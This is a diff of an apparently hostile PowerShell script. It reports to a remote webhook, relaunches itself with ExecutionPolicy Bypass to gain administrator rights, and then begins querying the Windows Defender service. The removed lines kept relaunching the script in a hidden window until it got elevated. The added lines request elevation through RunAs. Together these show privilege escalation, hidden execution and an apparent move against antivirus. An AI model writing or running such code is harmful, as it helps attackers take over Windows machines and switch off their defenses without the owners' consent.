@@ -18,23 +18,20 @@ Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd H
 
 try {
     $PSCommandPath = $MyInvocation.MyCommand.Path
-    while ($true) {
-        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-        if ($isAdmin) {
-            Send-WebhookMessage -Message 'Script is running with administrative privileges.'
-            break
-        } else {
-            Send-WebhookMessage -Message 'Requesting administrative privileges...'
-            try {
-                $shell = New-Object -ComObject "WScript.Shell"
-                $shell.Run('powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "' + $PSCommandPath + '"', 0, $false)
-                Start-Sleep -Seconds 3
-            } catch {
-                Send-WebhookMessage -Message "Failed to request admin privileges: $_"
-                Start-Sleep -Seconds 3
-            }
+    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if ($isAdmin) {
+        Send-WebhookMessage -Message 'Script is running with administrative privileges.'
+    } else {
+        Send-WebhookMessage -Message 'Requesting administrative privileges...'
+        try {
+            Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+            Exit
+        } catch {
+            Send-WebhookMessage -Message "Failed to request admin privileges: $_"
+            Start-Sleep -Seconds 3
         }
     }
+
 
     try {
         $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
